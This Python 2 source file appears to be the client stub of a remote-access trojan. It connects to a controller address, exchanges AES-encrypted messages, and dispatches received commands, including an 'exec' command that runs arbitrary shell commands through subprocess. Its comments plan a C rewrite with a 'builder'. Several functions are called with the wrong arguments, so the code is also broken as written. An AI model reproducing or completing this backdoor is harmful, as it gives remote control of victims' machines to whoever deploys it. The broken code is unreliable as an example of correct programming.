import socket
import os
import datetime
import hashlib
import subprocess
from time import strftime, sleep

from EasyEncryption import *

#############################
# this should be eventually coded in C, with a builder and such
# but this is all we have for now. hopefully we can model the C
# version after this however its messy as fuck atm
#############################

USE_LOGGING = True
LOG_FILE = open("stublog.log", "w")
LOG_FILE.write("stubtest log file\n")
LOG_FILE.write(strftime("%Y-%m-%d %H:%M:%S\n"))

def main(addr, port, key, update_rate=5):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((addr, port))

    update_rate = update_rate
    newkey = hashlib.sha256(key).digest()
    print "\n\nnonhashed key: {0}\nhashed key: {1}\n\n".format(key, newkey)

    while True:
        try:
            data = receive_decrypt_data(newkey, sock)
        except Exception, e:
            print "Socket Error\n{0}.".format(e)
            continue
        if data.startswith("*! "):
            data = data.replace("*! ", "")
            print "running {0}".format(data)

            commands[data](newkey, sock)
        else:
            send_encrypt_data("!* invalid command", newkey, sock)
            print 'sent'


def update(newkey, sock):
    send_encrypt_data("!updated", newkey, sock)

def system(command):
    send_encrypt_data(subprocess.Popen(command))

def verify(newkey, sock):
    send_encrypt_data("!* correct", newkey, sock)

def send_encrypt_data(data, key, sock):
    # debug
    print "sent: {0}".format(data)

    data = encrypt_aes256(data, key)  # returns the list [iv, encrypted]
    sock.send("{0}:{1}".format(data[0],data[1]))

    # debug

    return data[0]  # return the IV for decryption later

def receive_decrypt_data(key, sock):
    response = sock.recv(512)
    if response == "":
        raise Exception, "received empty string"

    try:
        response = [response.split(":")[0], response.split(":")[1]]

    except socket.error, e:
        print e
        exit()

    data = decrypt_aes256(response[1], key, response[0])
    data = data.strip(" ")
    # debug
    print "received: {0}".format(data)
    # /debug
    return data

if __name__ == "__main__":
    global commands
    commands = {
        "update": update,
        "exec": system,
        "verify": verify
    }
    main("127.0.0.1", 9001, "samplekey")
    LOG_FILE.close()
